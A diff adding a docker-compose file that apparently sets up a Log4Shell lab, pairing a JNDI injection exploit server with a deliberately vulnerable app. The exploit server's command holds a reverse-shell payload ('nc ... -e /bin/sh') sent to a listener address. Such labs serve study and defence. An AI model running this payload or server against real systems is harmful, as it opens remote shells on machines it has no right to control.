@@ -1,0 +1,17 @@
+version: '3.8'
+
+services:
+  ldap-server:
+    build:
+      context: JNDI-Injection-Exploit
+    ports:
+      - "1099:1099"
+      - "1389:1389"
+      - "8180:8180"
+    command: ['java', '-jar', '/home/app/ldap-server.jar', '-C', 'nc ${ADDRESS}:3000 -e /bin/sh', '-A', '${ADDRESS}']
+
+  vuln-app:
+    build:
+      context: log4shell-vulnerable-app
+    ports:
+      - "8080:8080"
